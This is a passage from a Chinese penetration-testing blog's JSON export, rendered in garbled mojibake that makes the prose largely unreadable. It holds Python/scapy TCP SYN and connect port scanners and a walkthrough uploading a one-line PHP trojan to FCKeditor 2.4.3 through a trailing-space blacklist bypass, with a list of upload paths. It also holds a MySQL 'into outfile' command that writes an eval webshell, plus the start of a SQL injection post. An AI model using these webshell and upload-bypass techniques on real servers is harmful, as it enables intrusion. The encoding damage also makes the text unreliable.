SYNæ‰«ææ¨¡å¼ã€‚ åŸç†ç®€ä»‹ æ­¤æ¨¡å¼ç±»ä¼¼äº nmap çš„ -sS æ¨¡å¼ï¼ˆnmapçš„é»˜è®¤æ‰«ææ¨¡å¼ï¼‰ TCP SYN æ‰«æä¹Ÿå°±æ˜¯åŠå¼€æ‰«æï¼ˆåŠå¼€å¼æ‰«æï¼‰ï¼Œè¿™ç§æ‰«ææ–¹å¼ä¸å…¨è¿æ¥æ‰«æç±»ä¼¼ï¼Œä½†å®¢æˆ·ç«¯ä¸ä¼šå’ŒæœåŠ¡ç«¯å»ºç«‹å®Œæ•´çš„è¿æ¥ã€‚ æ‰«æè¿‡ç¨‹ä¸ºï¼šå®¢æˆ·ç«¯ä¼šå‘é€ä¸€ä¸ªå¸¦æœ‰ SYN æ ‡è¯†å’Œç«¯å£å·çš„ TCP æ•°æ®åŒ…ç»™æœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨è¿™ä¸ªç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œåˆ™ä¼šæ¥å—è¿™ä¸ªè¿æ¥å¹¶è¿”å›ä¸€ä¸ªå¸¦æœ‰ SYN å’Œ ACK æ ‡è¯†çš„æ•°æ®åŒ…ç»™å®¢æˆ·ç«¯ï¼Œéšåå®¢æˆ·ç«¯ä¼šè¿”å›å¸¦æœ‰ RST æ ‡è¯†çš„æ•°æ®åŒ…ï¼Œè€Œä¸æ˜¯åƒå…¨è¿æ¥æ‰«æä¸€æ ·è¿”å›ä¸€ä¸ªå¸¦æœ‰ ACKå’Œ RST æ ‡è¯†çš„æ•°æ®åŒ…ï¼Œè¿™æ ·å°±ä¸ä¼šä¸æœåŠ¡ç«¯å»ºç«‹å®Œæ•´çš„è¿æ¥äº†ã€‚å¦‚æœç›®æ ‡ç«¯å£å¤„äºå…³é—­çŠ¶æ€ï¼Œåˆ™æœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ª RST æ ‡è¯†çš„æ•°æ®åŒ…ã€‚ å®Œæ•´ä»£ç åŠå¼€æ‰«æçš„å®ç°ä»£ç ä¸å…¨è¿æ¥æ‰«æçš„å®ç°ä»£ç å¾ˆç›¸ä¼¼ï¼Œä»åŸç†å°±å¯ä»¥çŸ¥é“ï¼Œä¸»è¦çš„åŒºåˆ«åœ¨äºå®¢æˆ·ç«¯å¯¹ç«¯å£ç¬¬äºŒæ¬¡å‘é€çš„æ•°æ®åŒ…flagsçš„å€¼ï¼Œç›´æ¥æ–­å¼€è¿æ¥ï¼Œè¿™æ ·å°±ä¸ä¼šè¿›è¡Œä¸€æ¬¡å®Œæ•´çš„TCPè¿æ¥ã€‚ å¦‚ä¸‹å›¾ï¼Œåªéœ€å°†å®¢æˆ·ç«¯ç¬¬äºŒæ¬¡å‘é€ç»™æœåŠ¡å™¨çš„ flags è®¾ç½®ä¸º R,å…¶ä»–çš„éƒ¨åˆ†ä¸ä¸Šä¸€ç¯‡å…¨å¼€æ‰«æä¸€è‡´ã€‚ ä»ç„¶ä½¿ç”¨ scapy é…åˆå¤šçº¿ç¨‹å®Œæˆã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import threading,timeimport sysfrom scapy.all import *import Print_Font as font # ç¬¬ä¸€ç¯‡æ–‡ç« ä¸­å°è£…çš„æ‰“å°é¢œè‰²æ–¹æ³•def get_ip(): '''ä»å‘½ä»¤è¡Œå‚æ•°ä¸­è·å– IP''' try: parameter = sys.argv ip = parameter[1] print('The IP you test is : ', end = '') font.print_YELLOW(ip) except Exception as e: print(e) return ipdef port_scan(port): '''æ‰«æç«¯å£''' try: packet = IP(dst=ip)/TCP(dport=port,flags='S') # æ„é€ ä¸€ä¸ª flags çš„å€¼ä¸º S çš„æŠ¥æ–‡ send = sr1(packet,timeout=2,verbose=0) if send.haslayer('TCP'): if send['TCP'].flags == 'SA': # åˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦è¿”å› SYN+ACK send_1 = sr1(IP(dst=ip)/TCP(dport=port,flags='R'),timeout=2,verbose=0) # åªå‘ç›®æ ‡ä¸»æœºå‘é€ RST font.print_GREEN('[+] %d is open' % port) elif send['TCP'].flags == 'RA': pass except: passdef main(): threads = [] threads_count = 100 # çº¿ç¨‹æ•°ï¼Œé»˜è®¤ 100 ä¸ªçº¿ç¨‹ packet_ping = IP(dst=ip)/ICMP() # åœ¨æ‰«æç«¯å£ä¹‹å‰å…ˆç”¨ ICMP åè®®æ¢æµ‹ä¸€ä¸‹ä¸»æœºæ˜¯å¦å­˜æ´» ping = sr1(packet_ping,timeout=2,verbose=0) if ping is not None: for p in range(1,1001): # é»˜è®¤æ‰«æ1-1000çš„ç«¯å£ï¼Œå¯ä»¥æ‰‹åŠ¨ä¿®æ”¹è¿™é‡Œçš„ç«¯å£èŒƒå›´ t = threading.Thread(target=port_scan,args=(p,)) threads.append(t) for t in threads: t.start() for t in threads: t.join() elif ping is None: font.print_RED('è¯¥ä¸»æœºå¤„äºå…³é—­çŠ¶æ€æˆ–æœ¬æœºè¢«è¯¥ä¸»æœºè¿‡æ»¤ï¼Œæ— æ³•å¯¹å…¶ä½¿ç”¨ ping æ¢æµ‹')if __name__ == '__main__': ip = get_ip() start_time = time.time() main() end_time = time.time() print('[time cost] : ' + str(end_time-start_time) + ' ç§’') ä½¿ç”¨æ–¹æ³•ï¼š1python TCP_SYN_Scan_Socket.py 14.215.177.38 æ‰«æç»“æœ","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"ç«¯å£","slug":"ç«¯å£","permalink":"http://yoursite.com/tags/%E7%AB%AF%E5%8F%A3/"},{"name":"æ‰«æå™¨","slug":"æ‰«æå™¨","permalink":"http://yoursite.com/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"}]},{"title":"Pythonæ‰“é€ ç«¯å£æ‰«æå™¨(1) - TCP Connect","slug":"Pythonæ‰“é€ ç«¯å£æ‰«æå™¨(1) - TCP Connect","date":"2020-05-25T04:00:00.000Z","updated":"2020-05-29T09:30:24.383Z","comments":true,"path":"2020/05/25/Pythonæ‰“é€ ç«¯å£æ‰«æå™¨(1) - TCP Connect/","link":"","permalink":"http://yoursite.com/2020/05/25/Python%E6%89%93%E9%80%A0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8(1)%20-%20TCP%20Connect/","excerpt":"","text":"å†™åœ¨å‰é¢å®é™…ä¸Šç°åœ¨æœ‰ä¸€äº›æ¯”è¾ƒå®Œå–„çš„ç¬¬ä¸‰æ–¹åº“å¯ä»¥ç›´æ¥æ‹¿æ¥æ‰«æç«¯å£ï¼Œæ¯”å¦‚ python-nmapï¼Œä¸ºä»€ä¹ˆæˆ‘è¿˜è¦å†™è¿™ä¸€ç³»åˆ—çš„æ–‡ç« ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ›´å¥½åœ°ç†è§£æ‰«æç«¯å£çš„è¿‡ç¨‹å’ŒåŸç†ï¼ŒçŸ¥å…¶ç„¶å¹¶ä¸”è¦çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚è¿™ç¯‡æ–‡ç« æ˜¯ python æ‰“é€ ç«¯å£æ‰«æå™¨çš„ç¬¬ä¸€ç¯‡ï¼Œé€šè¿‡ä¸¤ç§æ–¹æ³•ä»‹ç» TCP Connect æ‰«ææ¨¡å¼ã€‚ åŸç†ç®€ä»‹ æ­¤æ¨¡å¼ç±»ä¼¼äº nmap çš„ -sT æ¨¡å¼ TCP Connect æ‰«æåˆç§°å…¨è¿æ¥æ‰«æï¼Œåœ¨æ‰«ææ¯ä¸€ä¸ªç«¯å£æ—¶ï¼Œå®¢æˆ·ç«¯éƒ½ä¼šå°è¯•ä¸æœåŠ¡ç«¯è¿›è¡Œä¸€æ¬¡å®Œæ•´çš„3æ¬¡æ¡æ‰‹ã€‚å‡è®¾å®¢æˆ·ç«¯æƒ³æµ‹è¯•æœåŠ¡ç«¯çš„80ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œå°±ä¼šå°è¯•ä¸80ç«¯å£å»ºç«‹è¿æ¥æ¥è¿›è¡Œé€šä¿¡ï¼Œé¦–å…ˆå®¢æˆ·ç«¯ä¼šå‘é€ä¸€ä¸ªå¸¦æœ‰SYNæ ‡è¯†å’Œç«¯å£å·çš„TCPæ•°æ®åŒ…ç»™æœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨è¿™ä¸ªç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œåˆ™ä¼šæ¥å—è¿™ä¸ªè¿æ¥å¹¶è¿”å›ä¸€ä¸ªå¸¦æœ‰SYNå’ŒACKæ ‡è¯†çš„æ•°æ®åŒ…ç»™å®¢æˆ·ç«¯ï¼Œéšåå®¢æˆ·ç«¯ä¼šå‘é€å¸¦æœ‰ACKå’ŒRSTæ ‡è¯†çš„æ•°æ®åŒ…ç»™æœåŠ¡ç«¯ï¼Œè¿™æ ·å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å°±å»ºç«‹äº†è¿æ¥ã€‚å¦‚æœç«¯å£ä¸å¼€æ”¾ï¼ŒæœåŠ¡ç«¯åˆ™ä¼šè¿”å›ä¸€ä¸ªRSTæ ‡è¯†çš„æ•°æ®åŒ…ç»™å®¢æˆ·ç«¯ã€‚ ç®€è¨€ä¹‹ï¼Œç«¯å£å¼€æ”¾ï¼Œä¼šè¿æ¥æˆåŠŸï¼Œç«¯å£å…³é—­ï¼Œä¼šè¿æ¥å¤±è´¥ å®ç°ä»£ç  1å¼€å§‹ä¹‹å‰å…ˆæ–°å»ºä¸€ä¸ª Print_Font.py æ–‡ä»¶ï¼Œå°è£… print æ‰“å°é¢œè‰²çš„æ–¹æ³•ï¼Œæ˜¯ä¸ºäº†å°†æ‰«æçš„ç»“æœæ›´æ˜“äºè§‚å¯Ÿ 123456789101112131415'''å°† print æ‰“å°é¢œè‰²çš„æ–¹æ³•è¿›è¡Œå°è£…ï¼Œæ–¹ä¾¿è°ƒç”¨'''def print_RED(a): '''æ‰“å°çº¢è‰²''' print('\\033[31m%s\\033[0m' % a)def print_GREEN(a): '''æ‰“å°ç»¿è‰²''' print('\\033[32m%s\\033[0m' % a)def print_YELLOW(a): '''æ‰“å°é»„è‰²''' print('\\033[33m%s\\033[0m' % a) æ‰«æç«¯å£ä»£ç ä½¿ç”¨ python çš„ socket æ¨¡å—è¿›è¡Œ socket è¿æ¥ï¼Œé…åˆ threading,queue å¤šçº¿ç¨‹åŠ å¿«æ‰«æé€Ÿåº¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import threading,timefrom socket import *import queueimport sysimport Print_Font as fontsetdefaulttimeout(1) # è®¾ç½®æ•´ä¸ª socket å±‚çš„è¶…æ—¶æ—¶é—´ï¼Œå³æŸç«¯å£ 1 ç§’å†…æœªè¿æ¥æˆåŠŸåˆ™è·³è¿‡def get_ip(): '''ä»å‘½ä»¤è¡Œå‚æ•°ä¸­è·å– IP''' try: parameter = sys.argv ip = parameter[1] print('The IP you test is : ', end = '') font.print_YELLOW(ip) except Exception as e: print(e) return ipclass DoRun(threading.Thread): def __init__(self,queue_s): threading.Thread.__init__(self) self._queue = queue_s def run(self): '''æ‰«æç«¯å£çš„æ–¹æ³•''' while not self._queue.empty(): try: port = self._queue.get() s = socket(AF_INET, SOCK_STREAM) s.connect((ip, port)) font.print_GREEN('[+] %d is open' % port) except: passdef main(): threads = [] threads_count = 100 # çº¿ç¨‹æ•°ï¼Œé»˜è®¤ 100 queue_s = queue.Queue() for i in range(1,1001): # é»˜è®¤æ‰«æ1-1000çš„ç«¯å£ï¼Œå¯ä»¥æ‰‹åŠ¨ä¿®æ”¹è¿™é‡Œçš„ç«¯å£èŒƒå›´ queue_s.put(i) # ä½¿ç”¨ queue.Queue().put() æ–¹æ³•å°†ç«¯å£æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­ for i in range(threads_count): threads.append(DoRun(queue_s)) # æ‰«æçš„ç«¯å£ä¾æ¬¡æ·»åŠ åˆ°çº¿ç¨‹ç»„ for i in threads: i.start() for i in threads: i.join()if __name__ == '__main__': ip = get_ip() # è·å–å‘½ä»¤è¡Œä¼ å…¥çš„ IP start_time = time.time() main() end_time = time.time() print('[time cost] : ' + str(end_time-start_time) + ' ç§’') ä½¿ç”¨æ–¹æ³•ï¼š1python TCP_Connect_Scan_Socket.py 192.168.0.105 æ‰«æç»“æœ å®ç°ä»£ç  2é™¤äº† socketï¼Œè¿˜å¯ä»¥ä½¿ç”¨ scapy åº“ï¼Œscapy æ˜¯ä¸€ä¸ªç¬¬ä¸‰æ–¹åº“ï¼Œå®ƒèƒ½å¤Ÿå®ç°å¯¹ TCP/IP ä»¥ä¸‹å‡ ä¹æ‰€æœ‰åè®®çš„æ•°æ®åŒ…å®ç°å‘é€ã€æ•è·ã€åˆ†æå’Œæ„é€ ã€‚åˆ©ç”¨å®ƒå¯ä»¥åšæ‰«æã€æ¢æµ‹ã€ç½‘ç»œå‘ç°ç­‰ã€‚ å®‰è£… scapy1pip install scapy æ‰«æç«¯å£ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import threading,timeimport queueimport sysfrom scapy.all import *import Print_Font as fontdef get_ip(): '''ä»å‘½ä»¤è¡Œå‚æ•°ä¸­è·å– IP''' try: parameter = sys.argv ip = parameter[1] print('The IP you test is : ', end = '') font.print_YELLOW(ip) except Exception as e: print(e) return ipdef port_scan(port): try: packet = IP(dst=ip)/TCP(dport=port,flags='S') # æ„é€ ä¸€ä¸ª flags çš„å€¼ä¸º S çš„æŠ¥æ–‡ send = sr1(packet,timeout=2,verbose=0) if send.haslayer('TCP'): if send['TCP'].flags == 'SA': # åˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦è¿”å› SYN+ACK send_1 = sr1(IP(dst=ip)/TCP(dport=port,flags='AR'),timeout=2,verbose=0) # å‘ç›®æ ‡ä¸»æœºå‘é€ ACK+RST font.print_GREEN('[+] %d is open' % port) elif send['TCP'].flags == 'RA': pass except: passdef main(): threads = [] threads_count = 100 # çº¿ç¨‹æ•°ï¼Œé»˜è®¤ 100 ä¸ªçº¿ç¨‹ packet_ping = IP(dst=ip)/ICMP() # åœ¨æ‰«æç«¯å£ä¹‹å‰å…ˆç”¨ ICMP åè®®æ¢æµ‹ä¸€ä¸‹ä¸»æœºæ˜¯å¦å­˜æ´» ping = sr1(packet_ping,timeout=2,verbose=0) if ping is not None: for p in range(1,1001): # é»˜è®¤æ‰«æ1-1000çš„ç«¯å£ï¼Œå¯ä»¥æ‰‹åŠ¨ä¿®æ”¹è¿™é‡Œçš„ç«¯å£èŒƒå›´ t = threading.Thread(target=port_scan,args=(p,)) threads.append(t) for t in threads: t.start() for t in threads: t.join() elif ping is None: font.print_RED('è¯¥ä¸»æœºå¤„äºå…³é—­çŠ¶æ€æˆ–æœ¬æœºè¢«è¯¥ä¸»æœºè¿‡æ»¤ï¼Œæ— æ³•å¯¹å…¶ä½¿ç”¨ ping æ¢æµ‹')if __name__ == '__main__': ip = get_ip() start_time = time.time() main() end_time = time.time() print('[time cost] : ' + str(end_time-start_time) + ' ç§’') å…ˆç”¨ scapy æ„é€ ä¸€ä¸ª flags çš„å€¼ä¸º S çš„æŠ¥æ–‡ï¼ŒS ä»£è¡¨ SYNï¼Œå°±æ˜¯è¯·æ±‚å»ºç«‹ä¸€ä¸ª TCP è¿æ¥ï¼Œåœ¨æ¥æ”¶åˆ°æœåŠ¡å™¨è¿”å›çš„æŠ¥æ–‡ä¸­ï¼Œå¦‚æœ flag ä¸Šçš„å€¼ä¸º SAï¼ˆSYN,ACKï¼‰ï¼Œé‚£ä¹ˆå°±ä»£è¡¨æœåŠ¡å™¨ç¡®å®šæ¥æ”¶åˆ°å‘é€çš„è¿æ¥è¯·æ±‚å¹¶åŒæ„å»ºç«‹è¿æ¥ï¼Œè¿™æ—¶å€™å®¢æˆ·ç«¯å†å›åº”ä¸€ä¸ª ARï¼ˆACK,RSTï¼‰æŠ¥æ–‡ï¼Œç¡®å®šæ¥æ”¶åˆ°æœåŠ¡å™¨çš„å“åº”ï¼Œå»ºç«‹è¿æ¥ååˆç«‹åˆ»æ–­å¼€ã€‚ ä½¿ç”¨æ–¹æ³•ï¼š1python TCP_Connect_Scan_Scapy.py 182.131.4.2 æ‰«æç»“æœ ä¸Šé¢ä¸¤ä¸ªä¾‹å­éƒ½æ˜¯æ‰«æ 1-1000 ç«¯å£ï¼Œä½¿ç”¨ 100 ä¸ªçº¿ç¨‹ï¼Œéœ€è¦ä¿®æ”¹æ—¶åœ¨ä»£ç ä¸­ä¿®æ”¹ç›¸åº”çš„æ•°å­—ï¼Œæˆ–è€…åšæˆå‚æ•°åŒ–åœ¨å‘½ä»¤è¡Œä¼ å‚å³å¯ã€‚","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"ç«¯å£","slug":"ç«¯å£","permalink":"http://yoursite.com/tags/%E7%AB%AF%E5%8F%A3/"},{"name":"æ‰«æå™¨","slug":"æ‰«æå™¨","permalink":"http://yoursite.com/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"}]},{"title":"python ä¸­ print æ‰“å°æ˜¾ç¤ºé¢œè‰²","slug":"python ä¸­ print æ‰“å°æ˜¾ç¤ºé¢œè‰²","date":"2020-05-22T04:00:00.000Z","updated":"2020-05-22T08:59:20.346Z","comments":true,"path":"2020/05/22/python ä¸­ print æ‰“å°æ˜¾ç¤ºé¢œè‰²/","link":"","permalink":"http://yoursite.com/2020/05/22/python%20%E4%B8%AD%20print%20%E6%89%93%E5%8D%B0%E6%98%BE%E7%A4%BA%E9%A2%9C%E8%89%B2/","excerpt":"","text":"è¯­æ³•å’Œå‚æ•°1. æ‰“å°é¢œè‰²çš„è¯­æ³• åªæ·»åŠ æ–‡å­—é¢œè‰²ï¼š \\033[å­—ä½“è‰²å‚æ•°m......\\033[0m åªæ·»åŠ èƒŒæ™¯è‰²ï¼š \\033[èƒŒæ™¯è‰²å‚æ•°m......\\033[0m ç»¼åˆæ‰“å°ï¼š \\033[æ˜¾ç¤ºæ–¹å¼å‚æ•°;å­—ä½“è‰²å‚æ•°;èƒŒæ™¯è‰²å‚æ•°m......\\033[0m è¯­å¥ä¸­é—´çš„çœç•¥å·å°±æ˜¯éœ€è¦æ‰“å°çš„å­—ç¬¦ä¸² 2. å¯¹åº”çš„é¢œè‰²å‚æ•° æ˜¾ç¤ºæ–¹å¼ æ•ˆæœ 0 ç»ˆç«¯é»˜è®¤è®¾ç½® 1 é«˜äº®æ˜¾ç¤º(åŠ ç²—) 4 ä½¿ç”¨ä¸‹åˆ’çº¿ 5 é—ªçƒ 7 åç™½æ˜¾ç¤º 8 ä¸å¯è§ å­—ä½“é¢œè‰² èƒŒæ™¯è‰² é¢œè‰²æè¿° 30 40 é»‘è‰² 31 41 çº¢è‰² 32 42 ç»¿è‰² 33 43 é»„è‰² 34 44 è“è‰² 35 45 ç´«çº¢è‰² 36 46 é’è“è‰² 37 47 ç™½è‰² 3. DEMO12345678# é«˜äº®æ˜¾ç¤ºï¼Œå­—ä½“ç´«è‰²ï¼Œæ²¡æœ‰èƒŒæ™¯è‰²print('\\033[1;35mtest\\033[0m')# é«˜äº®æ˜¾ç¤ºï¼Œå­—ä½“ç»¿è‰²ï¼ŒèƒŒæ™¯çº¢è‰²print('\\033[1;32;41mtest\\033[0m')# ä¸é«˜äº®æ˜¾ç¤ºï¼Œå­—ä½“é»„è‰²ï¼ŒèƒŒæ™¯è“è‰²print('\\033[0;33;44mtest\\033[0m') å°è£…æˆæ–¹ä¾¿è°ƒç”¨çš„å‡½æ•°12345678910def printRED(a): '''æ‰“å°çº¢è‰²''' print('\\033[31m%s\\033[0m'%a)def printGREEN(a): '''æ‰“å°ç»¿è‰²''' print('\\033[32m%s\\033[0m'%a) printGREEN('[+] ' + '192.168.1.1')printRED('[-] ' + '192.168.1.2')","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"ç¼–è¾‘å™¨æ‹¿ webshell - FCKeditor 2.4.3","slug":"ç¼–è¾‘å™¨æ‹¿webshell - FCKeditor 2.4.3","date":"2020-05-07T12:00:00.000Z","updated":"2020-05-11T04:50:24.171Z","comments":true,"path":"2020/05/07/ç¼–è¾‘å™¨æ‹¿webshell - FCKeditor 2.4.3/","link":"","permalink":"http://yoursite.com/2020/05/07/%E7%BC%96%E8%BE%91%E5%99%A8%E6%8B%BFwebshell%20-%20FCKeditor%202.4.3/","excerpt":"","text":"æŸ¥çœ‹ fckeditor ç‰ˆæœ¬æœ‰ä¸¤ç§æ–¹å¼ 1http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;fckeditor&#x2F;editor&#x2F;dialog&#x2F;fck_about.html 1http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;fckeditor&#x2F;_whatsnew_.html æ¼æ´åˆ©ç”¨è¿™æ˜¯ fckeditor è‡ªå¸¦çš„ä¸€ä¸ªæµ‹è¯•æ–‡ä»¶ï¼Œå¦‚æœç®¡ç†å‘˜æ²¡æœ‰åˆ é™¤çš„è¯å°±ä¼šè¢«åˆ©ç”¨ï¼Œä»¥ php ä¸ºä¾‹ï¼Œconnectors é€‰ä¸­ php 1http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;test.html ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œè¢«æ‹¦æˆª å½“å‰æœåŠ¡å™¨æ˜¯ Windowsï¼Œè¿™é‡Œæ­¤ç‰ˆæœ¬çš„æ ¡éªŒä¸æ˜¯å¾ˆä¸¥è°¨ï¼Œåç¼€ååŠ ç©ºæ ¼å°±å¯ä»¥è½»æ¾ç»•è¿‡ ä¸Šä¼ æˆåŠŸ ç‚¹å‡»é¡µé¢ä¸Šçš„ Get folders and files ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šä¼ è·¯å¾„å’Œæ–‡ä»¶å æµè§ˆå™¨è®¿é—®ä¸€å¥è¯æœ¨é©¬ è¿ä¸Šèœåˆ€ FCK å…¶ä»–å¯èƒ½å­˜åœ¨çš„ä¸Šä¼ åœ°å€12345fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.htmlfckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;browser.html?Type&#x3D;Image&amp;Connector&#x3D;connectors&#x2F;jsp&#x2F;connectorfckeditor&#x2F;editor&#x2F;filemanager&#x2F;upload&#x2F;test.htmlfckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;test.htmlfckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;uploadtest.html æ¼æ´æºç åˆ†æé€šè¿‡æŠ“åŒ…å¾—çŸ¥ä¸Šä¼ æ–‡ä»¶çš„æ¥å£æ˜¯ 1&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;php&#x2F;connector.php?Command&#x3D;FileUpload&amp;Type&#x3D;File&amp;CurrentFolder&#x3D;&#x2F; 1.æ‰“å¼€æºç ä¸­çš„ connector.php æ–‡ä»¶ï¼Œè¿½è¸ª Command å‚æ•° 2.å½“å‚æ•°å€¼æ˜¯ FileUpload æ—¶ï¼ŒCommand å‚æ•°è¢« FileUpload() å‡½æ•°å¤„ç†äº† 3.ç»§ç»­è¿½è¸ªåˆ° commands.php æ–‡ä»¶ï¼ŒFileUpload() å‡½æ•°ä½¿ç”¨äº†é»‘åå• 4.ç»§ç»­è¿½è¸ªåˆ° config.php é…ç½®æ–‡ä»¶ï¼ŒæŸ¥åˆ°é»‘åå•å†…å®¹ï¼Œæ ¹æ®é»‘åå•æ²¡æœ‰é™åˆ¶çš„éƒ¨åˆ†è¿›è¡Œç»•è¿‡ï¼Œä¾‹å¦‚ Windows ä¸‹å¯ä»¥åœ¨åç¼€ååé¢åŠ ç©ºæ ¼æˆ–è€…ç‚¹ç»•è¿‡ã€‚","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"mysql secure_file_priv è®¾ç½®","slug":"mysql secure_file_priv è®¾ç½®","date":"2020-05-07T04:00:00.000Z","updated":"2020-05-07T13:05:00.277Z","comments":true,"path":"2020/05/07/mysql secure_file_priv è®¾ç½®/","link":"","permalink":"http://yoursite.com/2020/05/07/mysql%20secure_file_priv%20%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"æµ‹è¯• mysql å†™ webshell æ—¶éœ€è¦å¼€å¯ secure_file_privï¼Œå¦åˆ™æ— æ³•å†™å…¥ï¼Œè¯¥å‚æ•°åœ¨ mysql 5.6.34 ä»¥åé»˜è®¤æ˜¯ NULLã€‚ æŸ¥çœ‹ secure_file_priv çš„çŠ¶æ€1show variables like &#39;secure_file_priv&#39;; secure_file_priv çš„å€¼æœ‰ä¸‰ç§æƒ…å†µ å€¼ è§£é‡Š NULL(é»˜è®¤) ä¸å…è®¸å¯¼å…¥å¯¼å‡ºæ–‡ä»¶ D:\\test åªå…è®¸åœ¨ D:\\test ç›®å½•å¯¼å…¥å¯¼å‡ºæ–‡ä»¶ ç©º ä¸é™åˆ¶è·¯å¾„ï¼Œå¯ä»¥ä»»æ„å¯¼å…¥å¯¼å‡ºæ–‡ä»¶ é…ç½®æ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼šWindowsï¼šC:/mysql/my.iniLinuxï¼š/etc/mysql/my.conf ä¿®æ”¹é…ç½®æ–‡ä»¶åœ¨ mysql çš„å®‰è£…è·¯å¾„ä¸­æ‰“å¼€ my.ini é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹ [mysqld] ä¸‹çš„ secure_file_priv çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰ secure_file_priv å°±æ‰‹åŠ¨æ–°å¢ä¸€è¡Œ 12[mysqld]secure_file_priv &#x3D; ä¿®æ”¹å®Œæ¯•åé‡å¯ mysql ç”Ÿæ•ˆ å†™å…¥ webshell1select &quot;&lt;?php eval($_POST[&#39;x&#39;]);?&gt;&quot; into outfile &quot;D:&#x2F;test&#x2F;shell.php&quot;; æˆåŠŸå†™å…¥","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"æœç´¢æŸ¥è¯¢ç±»çš„ sql æ³¨å…¥å¿«é€Ÿåˆ¤æ–­å‚æ•°ç±»å‹å’Œé—­åˆç±»å‹","slug":"æœç´¢ç±»çš„ sql æ³¨å…¥å¿«é€Ÿåˆ¤æ–­å‚æ•°ç±»å‹å’Œé—­åˆç±»å‹","date":"2020-04-27T10:00:00.000Z","updated":"2020-05-07T08:03:10.093Z","comments":true,"path":"2020/04/27/æœç´¢ç±»çš„ sql æ³¨å…¥å¿«é€Ÿåˆ¤æ–­å‚æ•°ç±»å‹å’Œé—­åˆç±»å‹/","link":"","permalink":"http://yoursite.com/2020/04/27/%E6%90%9C%E7%B4%A2%E7%B1%BB%E7%9A%84%20sql%20%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%AD%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%92%8C%E9%97%AD%E5%90%88%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"0x00 åˆ¶ä½œé€šç”¨çš„å°å­—å…¸æœç´¢æŸ¥è¯¢ç±»çš„ sql è¯­å¥æ³¨å…¥ç¬¬ä¸€æ­¥é€šå¸¸æ˜¯åˆ¤æ–­æŸ¥è¯¢è¯­å¥çš„å‚æ•°ç±»å‹å’Œé—­åˆæ–¹å¼ï¼Œç„¶åè¿›è¡Œä¸‹ä¸€æ­¥çš„æ³¨å…¥ã€‚PHP ä¸­æœ€ç®€å•çš„æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ 1234select * from users where id&#x3D;$id;select * from users where id&#x3D;&#39;$id&#39;;select * from users where id&#x3D;(&quot;$id&quot;);ç­‰ç­‰... å‚æ•°ç±»å‹ï¼š int ç±»å‹ str ç±»å‹ é—­åˆç±»å‹: å•å¼•å· &#39; åŒå¼•å· &quot; å•å¼•å·å’Œæ‹¬å· &#39;) åŒå¼•å·å’Œæ‹¬å· &quot;) å•å¼•å·å’ŒåŒæ‹¬å· &#39;)) 